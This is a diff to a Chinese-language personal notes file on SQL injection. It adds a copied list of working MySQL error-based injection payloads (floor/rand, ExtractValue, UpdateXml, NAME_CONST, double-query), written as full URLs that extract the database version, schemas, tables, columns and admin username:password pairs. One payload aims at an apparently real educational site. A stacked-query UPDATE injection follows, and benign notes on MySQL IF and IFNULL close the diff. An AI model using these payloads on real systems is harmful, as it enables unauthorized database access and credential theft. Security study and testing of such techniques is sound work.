@@ -135,6 +135,93 @@
         结果：key#notfound!#    (这里我使用了XPATH爆数据，因为不知道什么原因用第一种方法暴不出来)
     　　username=admin%27%20and%20(extractvalue(1,%20concat(0x7e,(SELECT%20concat(username,0x3a,motto)%20FROM%20motto%20limit%203,1))))%20and%20%271%27=%271
     　　到了这里这道题目就算是做出来了。由于楼主刚刚学起上面如果有什么错误，请路过的大牛指正谢谢，同时也希望大牛们可以分享一些其他的注错方法。
+[MySQL暴错注入方法整理](http://www.waitalone.cn/mysql-error-based-injection.html)
+mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法
+1、通过floor暴错
+/*数据库版本*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*简单办法暴库*/
+http://www.waitalone.cn/sql.php?id=info()
+/*连接用户*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*连接数据库*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴库*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴表*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴字段*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+/*暴内容*/
+http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+2、ExtractValue(有长度限制,最长32位)
+http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
+3、UpdateXml(有长度限制,最长32位)
+http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+4、NAME_CONST(适用于低版本)
+http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&sid=19&cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
+5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)
+/*数据库版本*/
+http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+本文固定链接: http://www.
+===================================================================================
+MySQL===================================================================================
+SELECT first_name,last_name FROM users where user_id='1';update users set user='1337' WHERE USER_ID=3;select first_name,last_name from users where user_id='1'  #
+
+
+===================================================================================
+Oracle===================================================================================
+
+
+
+===================================================================================
+SQL Server===================================================================================
+
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+
+
+===================================================================================
+SQLite===================================================================================
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+
+===================================================================================
+===================================================================================
+
+
 ======================================================================================
 基于bool的注入(boolean-based injection):
 参考网址:
@@ -1481,3 +1568,26 @@ union 和union all 的区别：
 
 注意：union可以对字段名不同但数据类型相同的结果集进行合并；
       如果对字段名不同但数据类型相同的结果集进行合并，那么对此字段的orderby语句将失效。
+
+
+Mysql的if既可以作为表达式用，也可在存储过程中作为流程控制语句使用，如下是做为表达式使用：
+
+IF表达式
+IF(expr1,expr2,expr3)
+如果 expr1 是TRUE (expr1 <> 0 and expr1 <> NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。
+select *,if(sva=1,"男","女") as ssva from taname where sva != ""
+
+IFNULL(expr1,expr2)
+
+假如expr1 不为 NULL，则 IFNULL() 的返回值为 expr1; 否则其返回值为 expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。
+mysql> SELECT IFNULL(1,0);
+        -> 1
+mysql> SELECT IFNULL(NULL,10);
+        -> 10
+mysql> SELECT IFNULL(1/0,10);
+        -> 10
+mysql> SELECT IFNULL(1/0,'yes');
+        -> 'yes'
+IFNULL(expr1,expr2) 的默认结果值为两个表达式中更加“通用”的一个，顺序为STRING、 REAL或 INTEGER。
+
+
